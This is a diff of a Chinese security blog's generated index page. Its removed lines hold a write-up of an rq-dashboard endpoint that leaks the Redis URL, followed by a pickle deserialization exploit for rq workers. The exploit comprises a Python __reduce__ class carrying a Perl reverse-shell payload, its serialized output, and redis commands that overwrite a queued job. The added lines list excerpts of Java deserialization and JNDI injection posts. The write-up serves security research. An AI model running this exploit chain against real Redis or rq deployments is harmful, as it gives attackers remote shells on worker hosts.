@@ -45,7 +45,7 @@ ga('send', 'pageview');
 
   
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -171,65 +171,35 @@ ga('send', 'pageview');
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-rq-dashboard信息泄漏导致workerRCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-工具分析：TemplatesImpl链与代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/18/rq-dashboard%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4workerRCE/">rq-dashboard信息泄漏导致workerRCE</a>
+      <a class="article-title" href="/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">ysoserial工具分析：TemplatesImpl链与代码执行</a>
     </h1>
   
 
         
-        <a href="/2019/04/18/rq-dashboard%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4workerRCE/" class="archive-article-date">
-  	<time datetime="2019-04-18T09:11:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-18</time>
+        <a href="/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="archive-article-date">
+  	<time datetime="2020-09-25T02:20:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>查看rq-dashboard源码的时候发现有个rq-instances.json接口，直接返回了REDIS_URL</p>
-<h1 id="rq-instances-json泄漏redis-url"><a href="#rq-instances-json泄漏redis-url" class="headerlink" title="rq-instances.json泄漏redis url"></a>rq-instances.json泄漏redis url</h1><p>rq-dashboard 在#issue128 merge了两个接口，rq-instances，rq-instances.json，用于支持多个redis-url切换</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/GerardSoleCa/rq-dashboard/commit/dfac908b47bdd6ba6a507036c46666af9af09329">https://github.com/GerardSoleCa/rq-dashboard/commit/dfac908b47bdd6ba6a507036c46666af9af09329</a></p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blueprint.route(&#x27;/rq-instance/&lt;instance_number&gt;&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@jsonify</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_rq_instance</span>(<span class="params">instance_number</span>):</span></span><br><span class="line">    redis_url = current_app.config.get(<span class="string">&#x27;REDIS_URL&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(redis_url, list):</span><br><span class="line">        <span class="keyword">return</span> dict(status=<span class="string">&#x27;Single RQ. Not Permitted.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> int(instance_number) &gt;= len(redis_url):</span><br><span class="line">        <span class="keyword">raise</span> LookupError(<span class="string">&#x27;Index exceeds RQ list. Not Permitted.&#x27;</span>)</span><br><span class="line">    pop_connection()</span><br><span class="line">    current_app.redis_conn = from_url(redis_url[int(instance_number)])</span><br><span class="line">    push_rq_connection()</span><br><span class="line">    <span class="keyword">return</span> dict(status=<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blueprint.route(&#x27;/rq-instances.json&#x27;)</span></span><br><span class="line"><span class="meta">@jsonify</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_instances</span>():</span></span><br><span class="line">    <span class="keyword">return</span> dict(rq_instances=current_app.config.get(<span class="string">&#x27;REDIS_URL&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<p>其中current_app.config.get(‘REDIS_URL’)保存reids连接地址</p>
-<p>配合rq 的反序列化，可以实现rq worker的rce</p>
-<p><img src="/images/pasted-0.png" alt="upload successful"></p>
-<h1 id="rq-worker反序列化利用"><a href="#rq-worker反序列化利用" class="headerlink" title="rq worker反序列化利用"></a>rq worker反序列化利用</h1><p>rq 与redis之间使用cPickle/pickle 进行交互</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpickle</span>(<span class="params">pickled_string</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Unpickles a string, but raises a unified UnpickleError in case anything</span></span><br><span class="line"><span class="string">    fails.</span></span><br><span class="line"><span class="string">    This is a helper method to not have to deal with the fact that `loads()`</span></span><br><span class="line"><span class="string">    potentially raises many types of exceptions (e.g. AttributeError,</span></span><br><span class="line"><span class="string">    IndexError, TypeError, KeyError, etc.)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        obj = loads(pickled_string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> UnpickleError(<span class="string">&#x27;Could not unpickle&#x27;</span>, pickled_string, e)</span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure>
-
-<p>Job class 的data会被直接unpickle</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_unpickle_data</span>(<span class="params">self</span>):</span></span><br><span class="line">    self._func_name, self._instance, self._args, self._kwargs = unpickle(self.data)</span><br></pre></td></tr></table></figure>
-
-<p>对应在redis job data 字段</p>
-<p><img src="/images/pasted-1.png" alt="upload successful"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jobs.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis,from_url</span><br><span class="line"><span class="keyword">from</span> rq <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> jobs <span class="keyword">import</span> add</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = redis.Redis(host=&#x27;xxx.xxx.xxx.xxx&#x27;, port=6379, db=0)</span></span><br><span class="line"><span class="comment"># r.set(&quot;e6c36e69a9cf9543243d7921aa1a3d8093b49441&quot;, s)</span></span><br><span class="line"></span><br><span class="line">redis_conn=from_url(<span class="string">&#x27;redis://localhost:6379/1&#x27;</span>)</span><br><span class="line">q = Queue(connection=redis_conn)</span><br><span class="line"></span><br><span class="line">job=q.enqueue(add,a=<span class="number">2</span>,b=<span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s</span><br></pre></td></tr></table></figure>
-<pre><code>&#39;cposix\nsystem\np1\n(S\&#39;perl -e \\\&#39;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;\\\&#39;\&#39;\np2\ntRp3\n.&#39;</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r=redis_conn</span><br><span class="line">hashVal=r.hget(<span class="string">&#x27;rq:job:24c71cf9-0a8f-442b-a58b-49c4ca93b775&#x27;</span>,<span class="string">&#x27;data&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.hset(<span class="string">&#x27;rq:job:24c71cf9-0a8f-442b-a58b-49c4ca93b775&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,s)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h1><p><img src="/images/pasted-2.png" alt="upload successful"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
-<li><a target="_blank" rel="noopener" href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></li>
-<li><a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+        <p>ysoserial的payload只看过Groovy和CommonsCollections1，就一直以为ysoserial是简单的通过最终调用Runtime.getRuntime().exec(cmd)来实现各种利用链的命令执行的，太年轻。。。</p>
+<p>本文以CommonsCollections2为例，主要介绍：</p>
+<ol>
+<li>ysoserial通过TemplatesImpl实现的通用命令执行打包</li>
+<li>如何实现代码执行（非命令执行）</li>
 </ol>
-
+        
+          <a class="article-more-a" href="/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#more">more >></a>
+        
       
 
       
@@ -242,11 +212,15 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">rq</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">ysoserial</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">TemplatesImpl</a>
         		</li>
       		
 		</ul>
@@ -258,7 +232,405 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Python安全//" class="article-tag-list-link color4">Python安全</a>
+        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Java安全/Ysoserial//" class="article-tag-list-link color5">Ysoserial</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-JNDI-LDAP 注入及高版本JDK限制——上" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/">JNDI：JNDI-LDAP 注入及高版本JDK限制</a>
+    </h1>
+  
+
+        
+        <a href="/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/" class="archive-article-date">
+  	<time datetime="2020-07-23T02:43:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>引用参考【1】</p>
+<blockquote>
+<p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p>
+</blockquote>
+<blockquote>
+<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
+</blockquote>
+<p>不赘述JNDI相关背景，本节主要复现JNDI-LDAP注入，以及如何绕过高版本jdk上的限制</p>
+        
+          <a class="article-more-a" href="/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">JNDI</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">LDAP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-JNDI：JNDI-RMI 注入及绕过JDK高版本限制" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/16/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/">JNDI：JNDI-RMI 注入及绕过JDK高版本限制</a>
+    </h1>
+  
+
+        
+        <a href="/2020/07/16/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/" class="archive-article-date">
+  	<time datetime="2020-07-16T12:47:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>fastjson 配合jndi注入攻击，现在已经是很常见的姿势了。前文RMI 1中略微提到jndi-rmi 攻击client的思路，这里详细补充下。</p>
+<p>其实JNDI-RMI注入的核心是JNDI注入，RMI协议只是jndi支持的其中一种，其他还有很多。这里不做深入JNDI安全背景解释，只是因为和RMI略有关系，所以作为RMI系列只是简要跟进分析下。</p>
+        
+          <a class="article-more-a" href="/2020/07/16/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">JNDI</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RMI</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-RMI：绕过JEP290——下" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/">RMI：绕过JEP290——下</a>
+    </h1>
+  
+
+        
+        <a href="/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/" class="archive-article-date">
+  	<time datetime="2020-07-15T03:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前文留了个坑，8u231之后还出现了限制与绕过，填个坑</p>
+<p>本节的思路：</p>
+<ol>
+<li>回顾JEP290 bypass的原理</li>
+<li>8u231的限制，老的JRMP绕过方式为何不行了</li>
+<li>An Trinh的绕过方式</li>
+<li>8u241的限制</li>
+</ol>
+        
+          <a class="article-more-a" href="/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RMI</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">JEP290</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">enableReplace</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-RMI：绕过JEP290——中" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/">RMI：绕过JEP290——中</a>
+    </h1>
+  
+
+        
+        <a href="/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/" class="archive-article-date">
+  	<time datetime="2020-07-11T03:35:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本节主要解释前文留下的问题：</p>
+<p>只是建立了恶意JRMP的连接，但是没执行bind，为什么可以打成功？</p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>流程比较复杂，先直接给结论，绕过JEP290的原理是</p>
+<ol>
+<li>利用JEP290白名单内的类，覆盖掉registerRefs（此时未建立JRMP连接）</li>
+<li>Registry 处理bind请求，最后会触发DGC逻辑，DGC向registerRefs里保存的Server发送dirty请求</li>
+<li>DGC底层使用的是StreamRemoteCall.executeCall进行io的传输，executeCall发送完之后，会根据对方的反馈进行不同的操作，当对方返回一定条件时（初步判断是对方RMI Exception），会直接序列化InputStream，造成反序列化漏洞</li>
+</ol>
+        
+          <a class="article-more-a" href="/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RMI</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">JEP290</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
         		</li>
       		
 		</ul>
@@ -296,7 +668,7 @@ ga('send', 'pageview');
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/9/">« Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span>
+      <a class="extend prev" rel="prev" href="/page/9/">« Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/11/">Next »</a>
     </nav>
   
 
@@ -308,7 +680,7 @@ ga('send', 'pageview');
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2022 m0d9
+    		&copy; 2025 m0d9
     	</div>
       	<div class="footer-right">
       		<!-- <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten -->
@@ -641,11 +1013,67 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CobaltStrike</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">IAST</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">DongTai</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Kafka</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Jaas</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE-2020-9297</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">BeanValidation</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Dubbo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-33246</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RocketMQ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Tai-e</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-22518</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-46604</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Extractor</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Kylin</a>
               </li>
             
             <div class="clearfix"></div>
